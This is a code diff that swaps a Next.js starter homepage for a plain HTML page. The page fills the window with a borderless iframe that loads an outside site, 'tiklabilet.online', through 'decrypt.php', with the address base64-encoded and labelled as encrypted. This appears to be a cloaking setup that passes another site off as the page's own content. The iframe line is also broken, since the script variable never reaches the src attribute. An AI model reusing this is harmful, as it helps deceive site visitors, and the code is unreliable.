@@ -1,23 +1,32 @@
-import Head from 'next/head'
-import Header from '@components/Header'
-import Footer from '@components/Footer'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Örnek Sayfa</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
 
-export default function Home() {
-  return (
-    <div className="container">
-      <Head>
-        <title>Next.js Starter!</title>
-        <link rel="icon" href="/favicon.ico" />
-      </Head>
+        iframe {
+            width: 100%; /* İframe genişliği 100% */
+            height: 100vh; /* İframe yüksekliği ekran yüksekliğine eşit */
+            border: 0;
+            margin: 0; /* Margin'ı 0 olarak ayarla */
+        }
+    </style>
+</head>
+<body>
 
-      <main>
-        <Header title="Welcome to my app!" />
-        <p className="description">
-          Get started by editing <code>pages/index.js</code>
-        </p>
-      </main>
+    <script>
+        var iframeSrc = "https://tiklabilet.online";
+        var encryptedSrc = btoa(iframeSrc);
+    </script>
 
-      <Footer />
-    </div>
-  )
-}
+    <iframe src="decrypt.php?url=" + encryptedSrc></iframe>
+
+</body>
+</html>
